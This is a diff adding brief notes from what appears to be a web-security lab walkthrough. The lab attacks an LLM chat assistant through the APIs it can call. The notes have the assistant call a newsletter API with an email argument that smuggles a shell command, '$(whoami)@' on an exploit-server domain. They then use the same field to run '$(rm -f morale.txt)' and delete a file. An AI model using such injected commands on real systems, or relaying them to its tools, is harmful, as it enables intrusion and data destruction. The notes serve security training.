@@ -1,0 +1,19 @@
+ask about the APIs it has access to 
+
+ask it about the newsletter API and what arguments it has 
+
+
+call the newsletter API and send the argument $(whoami)@exploit-0ace009a0448735f815bc02301ea0014.exploit-server.net
+
+this gives us this in our inbox:
+carlos@exploit-0ace009a0448735f815bc02301ea0014.exploit-server.net
+
+this shows that the whoami command worked and that we can use other commands in the parenthesis()
+
+therefore we can delete the morale.txt file using rm -f morale.txt
+
+looking something like this:
+$(rm -f morale.txt)@exploit-0ace009a0448735f815bc02301ea0014.exploit-server.net
+
+
+
